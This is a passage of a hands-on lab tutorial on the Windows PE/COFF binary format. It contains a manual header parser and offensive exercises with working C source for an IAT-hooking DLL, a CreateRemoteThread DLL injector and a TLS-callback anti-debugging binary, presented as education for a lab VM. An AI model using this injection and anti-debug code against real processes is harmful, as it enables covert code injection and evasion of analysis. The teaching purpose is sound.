# Tutorial: PE/COFF Binary Format — Hands-On Lab

> **Companion to:** `domain1_chapter2_pe_coff.md`
> **Scope:** Full PE32+ on-disk and in-memory anatomy, injection techniques, IAT/EAT hooking, TLS callback abuse, DLL hijacking, Authenticode analysis, CFG/XFG validation, section injection, resource abuse, .NET metadata analysis, YARA rules, Sigma detection rules, and comprehensive hardening audits.
> **Prerequisites:** Familiarity with x86-64 assembly, C programming, Python 3.10+, Windows internals fundamentals. Access to a Windows 10/11 VM and a Linux analysis workstation.

---

## Lab Environment Setup

### Hardware and VM Requirements

| Component | Specification |
|-----------|--------------|
| Host OS | Linux (any distro) or Windows with nested virtualization |
| Windows VM | Windows 10/11 Pro x64, 8 GB RAM, 60 GB disk |
| Linux VM | Ubuntu 22.04+ or Kali, 4 GB RAM, 40 GB disk |
| Network | NAT or host-only between VMs — no internet required for most exercises |

### Windows VM Tool Installation

Open an **Administrator PowerShell** and run each block:

```powershell
# --- Package manager ---
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
winget install --id Microsoft.VisualStudio.2022.BuildTools --override "--add Microsoft.VisualStudio.Workload.VCTools --includeRecommended --quiet --wait"

# --- Python 3.12 + pip ---
winget install --id Python.Python.3.12 --accept-package-agreements --accept-source-agreements
pip install pefile yara-python lief pycryptodome capstone signify

# --- Sysinternals suite ---
winget install --id Microsoft.Sysinternals.ProcessMonitor
winget install --id Microsoft.Sysinternals.ProcessExplorer
winget install --id Microsoft.Sysinternals.Sigcheck
# Or download the full suite:
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" `
    -OutFile "$env:TEMP\SysinternalsSuite.zip"
Expand-Archive "$env:TEMP\SysinternalsSuite.zip" -DestinationPath "C:\Tools\Sysinternals" -Force

# --- PE-sieve + HollowsHunter ---
mkdir C:\Tools\PESieve -Force
Invoke-WebRequest -Uri "https://github.com/hasherezade/pe-sieve/releases/latest/download/pe-sieve64.exe" `
    -OutFile "C:\Tools\PESieve\pe-sieve64.exe"
Invoke-WebRequest -Uri "https://github.com/hasherezade/hollows_hunter/releases/latest/download/hollows_hunter64.exe" `
    -OutFile "C:\Tools\PESieve\hollows_hunter64.exe"

# --- YARA ---
Invoke-WebRequest -Uri "https://github.com/VirusTotal/yara/releases/latest/download/yara-master-2326-win64.zip" `
    -OutFile "$env:TEMP\yara.zip"
Expand-Archive "$env:TEMP\yara.zip" -DestinationPath "C:\Tools\YARA" -Force

# --- Ghidra ---
# Download from https://ghidra-sre.org/ and extract to C:\Tools\Ghidra

# --- x64dbg ---
# Download from https://x64dbg.com/ and extract to C:\Tools\x64dbg

# --- dnSpyEx (.NET decompiler) ---
mkdir C:\Tools\dnSpy -Force
# Download from https://github.com/dnSpyEx/dnSpy/releases and extract

# --- Add tools to PATH ---
$toolPaths = @("C:\Tools\Sysinternals", "C:\Tools\PESieve", "C:\Tools\YARA")
$currentPath = [Environment]::GetEnvironmentVariable("PATH", "User")
foreach ($p in $toolPaths) {
    if ($currentPath -notlike "*$p*") {
        $currentPath = "$currentPath;$p"
    }
}
[Environment]::SetEnvironmentVariable("PATH", $currentPath, "User")
```

### Linux VM Tool Installation

```bash
sudo apt update && sudo apt install -y python3-pip python3-venv gcc-mingw-w64-x86-64 \
    nasm radare2 binutils-mingw-w64 yara wine64 mono-complete

pip3 install pefile lief yara-python capstone signify pycryptodome
```

### Lab Directory Structure

```
C:\PELab\
├── samples\           # Target PE binaries for analysis
├── payloads\          # Generated test payloads
├── tools\             # Custom scripts and tools
├── output\            # Analysis results
├── rules\             # YARA and Sigma rules
└── framework\         # PE analysis framework (Part C)
```

```powershell
$dirs = @("C:\PELab\samples", "C:\PELab\payloads", "C:\PELab\tools",
          "C:\PELab\output", "C:\PELab\rules", "C:\PELab\framework")
foreach ($d in $dirs) { New-Item -ItemType Directory -Path $d -Force }
```

### Sample Binary Generation

Create minimal test binaries for the exercises:

```c
/* C:\PELab\samples\hello.c — minimal test PE */
#include <stdio.h>
#include <windows.h>

int main(void) {
    printf("Hello from PE lab target\n");
    MessageBoxA(NULL, "PE Lab Target", "Lab", MB_OK);
    return 0;
}
```

```powershell
# Compile with full mitigations
cl.exe /GS /guard:cf /DYNAMICBASE /HIGHENTROPYVA /NXCOMPAT /Fe:C:\PELab\samples\hello_hardened.exe C:\PELab\samples\hello.c user32.lib

# Compile WITHOUT mitigations (for comparison)
cl.exe /GS- /Fe:C:\PELab\samples\hello_weak.exe C:\PELab\samples\hello.c user32.lib /link /DYNAMICBASE:NO /NXCOMPAT:NO
```

---

## PART A: OFFENSIVE (Attack Scenarios)

---

### Exercise 1: PE Header Dissection and Manual Parsing

**Objective:** Parse a PE file by hand at the byte level, understand every header field, and identify security-relevant metadata without relying on automated tools.

#### Step 1: Raw hex inspection

```powershell
# Use PowerShell to dump the first 1024 bytes
$bytes = [System.IO.File]::ReadAllBytes("C:\PELab\samples\hello_hardened.exe")
$hex = ($bytes[0..1023] | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
# Print in 16-byte rows
for ($i = 0; $i -lt 1024; $i += 16) {
    $offset = '{0:X8}' -f $i
    $row = ($bytes[$i..($i+15)] | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
    $ascii = ($bytes[$i..($i+15)] | ForEach-Object {
        if ($_ -ge 0x20 -and $_ -le 0x7E) { [char]$_ } else { '.' }
    }) -join ''
    Write-Host "$offset  $row  $ascii"
}
```

#### Step 2: Parse DOS header manually

```python
#!/usr/bin/env python3
"""Exercise 1: Manual PE header parser — no pefile dependency."""
import struct
import sys

def parse_dos_header(data):
    """Parse IMAGE_DOS_HEADER (64 bytes)."""
    if len(data) < 64:
        raise ValueError("File too small for DOS header")

    fields = struct.unpack_from('<2s 29H I', data, 0)
    magic = fields[0]
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]

    print("=== IMAGE_DOS_HEADER ===")
    print(f"  e_magic      : {magic} (0x{struct.unpack('<H', magic)[0]:04X})")
    print(f"  e_lfanew     : 0x{e_lfanew:08X} (PE header offset)")

    # Check for Rich header between DOS stub and PE signature
    rich_end = data.find(b'Rich', 0x40, e_lfanew)
    if rich_end != -1:
        # Rich header key is the DWORD after 'Rich'
        rich_key = struct.unpack_from('<I', data, rich_end + 4)[0]
        # Find 'DanS' marker (XOR-encoded with same key)
        dans_marker = struct.pack('<I', 0x536E6144 ^ rich_key)
        rich_start = data.find(dans_marker, 0x40, rich_end)
        if rich_start != -1:
            print(f"\n  Rich Header  : offset 0x{rich_start:X} - 0x{rich_end + 8:X}")
            print(f"  Rich XOR Key : 0x{rich_key:08X}")
            # Decode comp.id entries
            decoded = bytearray()
            for i in range(rich_start, rich_end, 4):
                val = struct.unpack_from('<I', data, i)[0] ^ rich_key
                decoded.extend(struct.pack('<I', val))
            # Skip DanS + 3 padding DWORDs
            entries = decoded[16:]
            print(f"  Comp.ID entries ({len(entries) // 8}):")
            for j in range(0, len(entries), 8):
                if j + 8 > len(entries):
                    break
                comp_id, count = struct.unpack_from('<II', entries, j)
                build = comp_id & 0xFFFF
                prod_id = (comp_id >> 16) & 0xFFFF
                print(f"    Product={prod_id:5d}  Build={build:5d}  Count={count}")
    else:
        print("  Rich Header  : NOT FOUND")

    return e_lfanew

def parse_pe_signature(data, offset):
    """Verify PE signature at e_lfanew."""
    sig = data[offset:offset+4]
    print(f"\n=== PE Signature at 0x{offset:X} ===")
    print(f"  Signature    : {sig} ({'VALID' if sig == b'PE\\x00\\x00' else 'INVALID'})")
    return offset + 4

def parse_coff_header(data, offset):
    """Parse IMAGE_FILE_HEADER (20 bytes)."""
    fields = struct.unpack_from('<HH I I I HH', data, offset)
    machine, num_sections, timestamp, sym_ptr, num_syms, opt_size, chars = fields

    MACHINES = {
        0x014C: "i386", 0x8664: "AMD64", 0xAA64: "ARM64",
        0xA641: "ARM64EC", 0x01C4: "ARM"
    }

    print(f"\n=== IMAGE_FILE_HEADER (COFF) at 0x{offset:X} ===")
    print(f"  Machine           : 0x{machine:04X} ({MACHINES.get(machine, 'UNKNOWN')})")
    print(f"  NumberOfSections  : {num_sections}")

    import datetime
    try:
        dt = datetime.datetime.utcfromtimestamp(timestamp)
        ts_str = dt.isoformat() + "Z"
    except (OSError, ValueError):
        ts_str = f"invalid (0x{timestamp:08X})"
    print(f"  TimeDateStamp     : 0x{timestamp:08X} ({ts_str})")
    print(f"  SizeOfOptionalHdr : {opt_size} ({'PE32+' if opt_size == 240 else 'PE32' if opt_size == 224 else 'OBJECT' if opt_size == 0 else 'UNUSUAL'})")

    char_flags = []
    if chars & 0x0001: char_flags.append("RELOCS_STRIPPED")
    if chars & 0x0002: char_flags.append("EXECUTABLE")
    if chars & 0x0020: char_flags.append("LARGE_ADDRESS_AWARE")
    if chars & 0x2000: char_flags.append("DLL")
    print(f"  Characteristics   : 0x{chars:04X} ({', '.join(char_flags)})")

    return offset + 20, opt_size, num_sections

def parse_optional_header(data, offset):
    """Parse IMAGE_OPTIONAL_HEADER64 (240 bytes + data directories)."""
    magic = struct.unpack_from('<H', data, offset)[0]
    is_pe32plus = (magic == 0x20B)

    print(f"\n=== IMAGE_OPTIONAL_HEADER{'64' if is_pe32plus else '32'} at 0x{offset:X} ===")
    print(f"  Magic             : 0x{magic:04X} ({'PE32+' if is_pe32plus else 'PE32'})")

    if is_pe32plus:
        ep = struct.unpack_from('<I', data, offset + 16)[0]
        image_base = struct.unpack_from('<Q', data, offset + 24)[0]
        sect_align = struct.unpack_from('<I', data, offset + 32)[0]
        file_align = struct.unpack_from('<I', data, offset + 36)[0]
        size_image = struct.unpack_from('<I', data, offset + 56)[0]
        size_hdrs = struct.unpack_from('<I', data, offset + 60)[0]
        checksum = struct.unpack_from('<I', data, offset + 64)[0]
        subsystem = struct.unpack_from('<H', data, offset + 68)[0]
        dll_chars = struct.unpack_from('<H', data, offset + 70)[0]
        num_dirs = struct.unpack_from('<I', data, offset + 108)[0]
    else:
        ep = struct.unpack_from('<I', data, offset + 16)[0]
        image_base = struct.unpack_from('<I', data, offset + 28)[0]
        sect_align = struct.unpack_from('<I', data, offset + 32)[0]
        file_align = struct.unpack_from('<I', data, offset + 36)[0]
        size_image = struct.unpack_from('<I', data, offset + 56)[0]
        size_hdrs = struct.unpack_from('<I', data, offset + 60)[0]
        checksum = struct.unpack_from('<I', data, offset + 64)[0]
        subsystem = struct.unpack_from('<H', data, offset + 68)[0]
        dll_chars = struct.unpack_from('<H', data, offset + 70)[0]
        num_dirs = struct.unpack_from('<I', data, offset + 92)[0]

    SUBSYSTEMS = {
        0: "UNKNOWN", 1: "NATIVE", 2: "WINDOWS_GUI", 3: "WINDOWS_CUI",
        7: "POSIX_CUI", 9: "WINDOWS_CE_GUI", 10: "EFI_APPLICATION",
        11: "EFI_BOOT_SERVICE_DRIVER", 12: "EFI_RUNTIME_DRIVER", 13: "EFI_ROM",
        14: "XBOX", 16: "WINDOWS_BOOT_APPLICATION"
    }

    print(f"  AddressOfEntryPoint: 0x{ep:08X}")
    print(f"  ImageBase         : 0x{image_base:016X}")
    print(f"  SectionAlignment  : 0x{sect_align:X}")
    print(f"  FileAlignment     : 0x{file_align:X}")
    print(f"  SizeOfImage       : 0x{size_image:X}")
    print(f"  SizeOfHeaders     : 0x{size_hdrs:X}")
    print(f"  CheckSum          : 0x{checksum:08X}")
    print(f"  Subsystem         : {subsystem} ({SUBSYSTEMS.get(subsystem, '?')})")

    # Decode DllCharacteristics
    mitigations = []
    if dll_chars & 0x0020: mitigations.append("HIGH_ENTROPY_VA")
    if dll_chars & 0x0040: mitigations.append("DYNAMIC_BASE (ASLR)")
    if dll_chars & 0x0080: mitigations.append("FORCE_INTEGRITY")
    if dll_chars & 0x0100: mitigations.append("NX_COMPAT (DEP)")
    if dll_chars & 0x0200: mitigations.append("NO_ISOLATION")
    if dll_chars & 0x0400: mitigations.append("NO_SEH")
    if dll_chars & 0x0800: mitigations.append("NO_BIND")
    if dll_chars & 0x1000: mitigations.append("APPCONTAINER")
    if dll_chars & 0x4000: mitigations.append("GUARD_CF (CFG)")
    if dll_chars & 0x8000: mitigations.append("TERMINAL_SERVER_AWARE")
    print(f"  DllCharacteristics: 0x{dll_chars:04X}")
    for m in mitigations:
        print(f"    [+] {m}")
    print(f"  NumberOfRvaAndSizes: {num_dirs}")

    # Parse data directories
    DIR_NAMES = [
        "Export", "Import", "Resource", "Exception", "Certificate",
        "BaseRelocation", "Debug", "Architecture", "GlobalPtr", "TLS",
        "LoadConfig", "BoundImport", "IAT", "DelayImport", "CLR", "Reserved"
    ]
    dd_offset = offset + (112 if is_pe32plus else 96)
    print(f"\n  Data Directories:")
    for i in range(min(num_dirs, 16)):
        rva, size = struct.unpack_from('<II', data, dd_offset + i * 8)
        if rva or size:
            name = DIR_NAMES[i] if i < len(DIR_NAMES) else f"Dir_{i}"
            note = "(file offset, not RVA)" if i == 4 else ""
            print(f"    [{i:2d}] {name:<18} RVA=0x{rva:08X}  Size=0x{size:X} {note}")

    return dd_offset + num_dirs * 8

def parse_section_table(data, offset, num_sections):
    """Parse IMAGE_SECTION_HEADER array."""
    import math

    print(f"\n=== Section Table at 0x{offset:X} ({num_sections} sections) ===")
    print(f"  {'Name':<10} {'VirtAddr':>10} {'VirtSize':>10} {'RawOff':>10} "
          f"{'RawSize':>10} {'Chars':>10} {'Entropy':>8} Flags")
    print("  " + "-" * 90)

    for i in range(num_sections):
        sec_off = offset + i * 40
        name_raw = data[sec_off:sec_off + 8]
        name = name_raw.rstrip(b'\x00').decode('utf-8', errors='replace')
        vsize = struct.unpack_from('<I', data, sec_off + 8)[0]
        vaddr = struct.unpack_from('<I', data, sec_off + 12)[0]
        raw_size = struct.unpack_from('<I', data, sec_off + 16)[0]
        raw_off = struct.unpack_from('<I', data, sec_off + 20)[0]
        chars = struct.unpack_from('<I', data, sec_off + 36)[0]

        # Calculate entropy
        if raw_size > 0 and raw_off + raw_size <= len(data):
            sec_data = data[raw_off:raw_off + raw_size]
            freq = [0] * 256
            for b in sec_data:
                freq[b] += 1
            ent = -sum((f/len(sec_data)) * math.log2(f/len(sec_data))
                       for f in freq if f > 0)
        else:
            ent = 0.0

        flags = []
        if chars & 0x20000000: flags.append("X")
        if chars & 0x40000000: flags.append("R")
        if chars & 0x80000000: flags.append("W")
        if chars & 0x20000000 and chars & 0x80000000:
            flags.append("[W^X!]")
        if ent > 7.0:
            flags.append("[PACKED?]")

        flag_str = " ".join(flags)
        print(f"  {name:<10} 0x{vaddr:08X} 0x{vsize:08X} "
              f"0x{raw_off:08X} 0x{raw_size:08X} "
              f"0x{chars:08X} {ent:>8.4f} {flag_str}")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pe_file>")
        sys.exit(1)

    with open(sys.argv[1], 'rb') as f:
        data = f.read()

    e_lfanew = parse_dos_header(data)
    coff_offset = parse_pe_signature(data, e_lfanew)
    sec_offset, opt_size, num_secs = parse_coff_header(data, coff_offset)
    end_opt = parse_optional_header(data, sec_offset)
    parse_section_table(data, sec_offset + opt_size, num_secs)

if __name__ == '__main__':
    main()
```

**Expected output (abbreviated):**

```
=== IMAGE_DOS_HEADER ===
  e_magic      : b'MZ' (0x5A4D)
  e_lfanew     : 0x000000F0 (PE header offset)

  Rich Header  : offset 0x80 - 0xE8
  Rich XOR Key : 0xA3B4C5D6
  Comp.ID entries (5):
    Product=  259  Build=30148  Count=7
    ...

=== PE Signature at 0xF0 ===
  Signature    : b'PE\x00\x00' (VALID)

=== IMAGE_FILE_HEADER (COFF) at 0xF4 ===
  Machine           : 0x8664 (AMD64)
  NumberOfSections  : 6
  TimeDateStamp     : 0x66A1B2C3 (2025-07-25T14:30:11Z)
  ...

=== IMAGE_OPTIONAL_HEADER64 at 0x108 ===
  Magic             : 0x020B (PE32+)
  AddressOfEntryPoint: 0x00001000
  ImageBase         : 0x0000000140000000
  DllCharacteristics: 0x8160
    [+] HIGH_ENTROPY_VA
    [+] DYNAMIC_BASE (ASLR)
    [+] NX_COMPAT (DEP)
    [+] TERMINAL_SERVER_AWARE
```

#### Step 3: Verify results against automated tools

```powershell
# Compare with dumpbin
dumpbin /headers C:\PELab\samples\hello_hardened.exe

# Compare with Python pefile
python -c "
import pefile
pe = pefile.PE(r'C:\PELab\samples\hello_hardened.exe')
pe.print_info()
pe.close()
"
```

**Verification:** Manual parser output must match dumpbin/pefile output for every header field. Any discrepancy indicates a parsing bug — fix it before proceeding.

---

### Exercise 2: IAT Hooking — Intercepting API Calls

**Objective:** Build a DLL that, when injected into a target process, hooks the Import Address Table to intercept and redirect specific API calls. Understand the IAT structure at the byte level.

**Context:** This technique is used by both malware (credential stealing, behavior modification) and legitimate tools (API monitoring, sandboxing). It exploits the fact that PE imports resolve through the IAT — a writable table of function pointers.

#### Step 1: Create the hook DLL

```c
/* C:\PELab\payloads\iat_hook.c
 * IAT hook DLL: intercepts MessageBoxA to log and modify calls.
 * Authorized security research / educational use only.
 */
#include <windows.h>
#include <stdio.h>

/* Original function pointer */
typedef int (WINAPI *pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
static pMessageBoxA OriginalMessageBoxA = NULL;

/* Detour function */
int WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText,
                              LPCSTR lpCaption, UINT uType) {
    /* Log the intercepted call */
    FILE *logf = fopen("C:\\PELab\\output\\iat_hook_log.txt", "a");
    if (logf) {
        fprintf(logf, "[IAT HOOK] MessageBoxA intercepted:\n");
        fprintf(logf, "  Caption: %s\n", lpCaption ? lpCaption : "(null)");
        fprintf(logf, "  Text   : %s\n", lpText ? lpText : "(null)");
        fprintf(logf, "  Type   : 0x%X\n", uType);
        fclose(logf);
    }

    /* Modify the message to prove the hook works */
    return OriginalMessageBoxA(hWnd,
        "[HOOKED] Original text was intercepted",
        "[IAT HOOK ACTIVE]", uType);
}

/* Walk the IAT and install the hook */
BOOL InstallIATHook(HMODULE hModule, const char *targetDll,
                     const char *targetFunc, void *detour,
                     void **original) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)
        ((PBYTE)hModule + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD importRVA = nt->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA == 0) return FALSE;

    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)
        ((PBYTE)hModule + importRVA);

    for (; imp->Name != 0; imp++) {
        const char *dllName = (const char *)((PBYTE)hModule + imp->Name);
        if (_stricmp(dllName, targetDll) != 0) continue;

        PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)
            ((PBYTE)hModule + imp->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 iatThunk = (PIMAGE_THUNK_DATA64)
            ((PBYTE)hModule + imp->FirstThunk);

        for (; origThunk->u1.AddressOfData != 0; origThunk++, iatThunk++) {
            if (IMAGE_SNAP_BY_ORDINAL64(origThunk->u1.Ordinal))
                continue;

            PIMAGE_IMPORT_BY_NAME hint = (PIMAGE_IMPORT_BY_NAME)
                ((PBYTE)hModule + origThunk->u1.AddressOfData);

            if (strcmp(hint->Name, targetFunc) != 0) continue;

            /* Found the target — save original and patch */
            DWORD oldProtect;
            VirtualProtect(&iatThunk->u1.Function,
                           sizeof(ULONGLONG),
                           PAGE_READWRITE, &oldProtect);

            *original = (void *)iatThunk->u1.Function;
            iatThunk->u1.Function = (ULONGLONG)detour;

            VirtualProtect(&iatThunk->u1.Function,
                           sizeof(ULONGLONG),
                           oldProtect, &oldProtect);

            return TRUE;
        }
    }
    return FALSE;
}

/* Remove the hook (restore original) */
BOOL RemoveIATHook(HMODULE hModule, const char *targetDll,
                    const char *targetFunc, void *original) {
    /* Same walk logic, but write back the original address */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)
        ((PBYTE)hModule + dos->e_lfanew);
    DWORD importRVA = nt->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)
        ((PBYTE)hModule + importRVA);

    for (; imp->Name != 0; imp++) {
        if (_stricmp((char *)hModule + imp->Name, targetDll) != 0) continue;
        PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)
            ((PBYTE)hModule + imp->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 iatThunk = (PIMAGE_THUNK_DATA64)
            ((PBYTE)hModule + imp->FirstThunk);
        for (; origThunk->u1.AddressOfData != 0; origThunk++, iatThunk++) {
            if (IMAGE_SNAP_BY_ORDINAL64(origThunk->u1.Ordinal)) continue;
            PIMAGE_IMPORT_BY_NAME hint = (PIMAGE_IMPORT_BY_NAME)
                ((PBYTE)hModule + origThunk->u1.AddressOfData);
            if (strcmp(hint->Name, targetFunc) != 0) continue;
            DWORD oldProtect;
            VirtualProtect(&iatThunk->u1.Function, sizeof(ULONGLONG),
                           PAGE_READWRITE, &oldProtect);
            iatThunk->u1.Function = (ULONGLONG)original;
            VirtualProtect(&iatThunk->u1.Function, sizeof(ULONGLONG),
                           oldProtect, &oldProtect);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        InstallIATHook(GetModuleHandle(NULL), "user32.dll",
                       "MessageBoxA", HookedMessageBoxA,
                       (void **)&OriginalMessageBoxA);
        break;
    case DLL_PROCESS_DETACH:
        if (OriginalMessageBoxA) {
            RemoveIATHook(GetModuleHandle(NULL), "user32.dll",
                          "MessageBoxA", OriginalMessageBoxA);
        }
        break;
    }
    return TRUE;
}
```

#### Step 2: Build the hook DLL

```powershell
cl.exe /LD /Fe:C:\PELab\payloads\iat_hook.dll C:\PELab\payloads\iat_hook.c user32.lib
```

#### Step 3: Create a simple injector for testing

```c
/* C:\PELab\payloads\injector.c
 * Basic DLL injector using CreateRemoteThread + LoadLibraryA.
 * For authorized lab use only.
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcessId(const char *processName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: injector.exe <process_name> <dll_path>\n");
        return 1;
    }

    DWORD pid = FindProcessId(argv[1]);
    if (!pid) {
        printf("[-] Process '%s' not found\n", argv[1]);
        return 1;
    }
    printf("[+] Found PID: %lu\n", pid);

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    size_t pathLen = strlen(argv[2]) + 1;
    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, pathLen,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    if (!remoteBuf) {
        printf("[-] VirtualAllocEx failed\n");
        CloseHandle(hProc);
        return 1;
    }

    WriteProcessMemory(hProc, remoteBuf, argv[2], pathLen, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA"),
        remoteBuf, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
    } else {
        printf("[+] DLL injected successfully\n");
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return 0;
}
```

```powershell
cl.exe /Fe:C:\PELab\payloads\injector.exe C:\PELab\payloads\injector.c
```

#### Step 4: Test the hook

```powershell
# Start the target in one terminal
Start-Process C:\PELab\samples\hello_hardened.exe

# Inject the hook DLL from another terminal (run as Admin)
C:\PELab\payloads\injector.exe hello_hardened.exe C:\PELab\payloads\iat_hook.dll
```

**Expected result:** The target's MessageBoxA shows "[IAT HOOK ACTIVE]" as caption and "[HOOKED]" text. The log file at `C:\PELab\output\iat_hook_log.txt` records the original arguments.

**Verification:** Check the log file and observe the modified message box. Then read the IAT in memory using a debugger to confirm the patched address.

---

### Exercise 3: TLS Callback Anti-Debug Implementation

**Objective:** Create a PE binary that uses TLS callbacks to execute code before `main()`, implementing anti-debug checks that fire before any entry-point breakpoint.

#### Step 1: Build the anti-debug TLS callback binary

```c
/* C:\PELab\payloads\tls_antidebug.c
 * TLS callback runs BEFORE EntryPoint. Demonstrates anti-debug via:
 * 1. PEB.BeingDebugged flag
 * 2. NtGlobalFlag heap debug flags
 * 3. NtQueryInformationProcess (ProcessDebugPort)
 * 4. Timing check (rdtsc delta)
 */
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

/* Forward declarations for TLS callback */
void NTAPI TlsCallback_AntiDebug(PVOID DllHandle,
                                   DWORD Reason, PVOID Reserved);

/* Register the TLS callback using CRT data segments */
#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK _tls_cb_array[] = {
    TlsCallback_AntiDebug,
    NULL
};
#pragma const_seg()
#endif

/* Detection results — set by TLS callback, read by main */
static volatile BOOL g_debugger_detected = FALSE;
static volatile DWORD g_detection_method = 0;

void NTAPI TlsCallback_AntiDebug(PVOID DllHandle,
                                   DWORD Reason, PVOID Reserved) {
    if (Reason != DLL_PROCESS_ATTACH)
        return;

    /* --- Check 1: PEB.BeingDebugged --- */
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) {
        g_debugger_detected = TRUE;
        g_detection_method = 1;
        return;
    }

    /* --- Check 2: NtGlobalFlag (PEB + 0xBC on x64) --- */
    DWORD ntGlobalFlag = *(DWORD *)((PBYTE)peb + 0xBC);
    /* FLG_HEAP_ENABLE_TAIL_CHECK  (0x10)
     * FLG_HEAP_ENABLE_FREE_CHECK  (0x20)
     * FLG_HEAP_VALIDATE_PARAMETERS (0x40) */
    if (ntGlobalFlag & 0x70) {
        g_debugger_detected = TRUE;
        g_detection_method = 2;
        return;
    }

    /* --- Check 3: ProcessDebugPort via NtQueryInformationProcess --- */
    pNtQueryInformationProcess NtQIP =
        (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"),
            "NtQueryInformationProcess");
    if (NtQIP) {
        DWORD_PTR debugPort = 0;
        NTSTATUS status = NtQIP(GetCurrentProcess(),
                                 7, /* ProcessDebugPort */
                                 &debugPort, sizeof(debugPort), NULL);
        if (status == 0 && debugPort != 0) {
            g_debugger_detected = TRUE;
            g_detection_method = 3;
            return;
        }
    }

    /* --- Check 4: Timing — rdtsc delta (large gap = single-stepping) --- */
    unsigned __int64 t1 = __rdtsc();
    /* Execute some trivial work */
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    unsigned __int64 t2 = __rdtsc();

    /* Threshold: > 10M cycles between 100 iterations = suspect */
    if ((t2 - t1) > 10000000) {
        g_debugger_detected = TRUE;
        g_detection_method = 4;
        return;
    }
}

int main(void) {
    /* By the time we reach here, TLS callback has already run */
    if (g_debugger_detected) {
        printf("[!] Debugger detected via method %lu\n", g_detection_method);
        printf("    Methods: 1=PEB.BeingDebugged  2=NtGlobalFlag\n");
        printf("             3=ProcessDebugPort   4=RDTSC timing\n");
        /* In real malware, this would ExitProcess, corrupt state,
         * or branch to decoy logic. We just report. */
        return 1;
    }

    printf("[+] No debugger detected. Running normally.\n");
    printf("[+] TLS callback executed BEFORE this main().\n");
    MessageBoxA(NULL, "Clean execution — no debugger", "TLS Lab", MB_OK);
    return 0;
}
```

#### Step 2: Build and verify TLS directory

```powershell
cl.exe /Fe:C:\PELab\payloads\tls_antidebug.exe C:\PELab\payloads\tls_antidebug.c user32.lib ntdll.lib

# Verify TLS directory is present
dumpbin /tls C:\PELab\payloads\tls_antidebug.exe
```

**Expected dumpbin output:**

```
  TLS Callbacks

            Address
            --------
            0000000140001000   <-- TLS callback function address
            0000000000000000   <-- NULL terminator
```

#### Step 3: Test under debugger vs clean

```powershell
# Clean run — should show "No debugger detected"
C:\PELab\payloads\tls_antidebug.exe

# Under x64dbg — should detect the debugger
# Open x64dbg, load tls_antidebug.exe, let it run
```

#### Step 4: Analyst countermeasures

When reversing a binary with TLS callbacks:

```
1. In x64dbg: Options → Preferences → Events → check "TLS Callbacks"
   This makes the debugger break at each TLS callback entry.

2. Set breakpoint on ntdll!LdrpCallTlsInitializers before run.

3. Patch PEB.BeingDebugged:
   - In x64dbg command line: mov byte ptr gs:[60]+2, 0
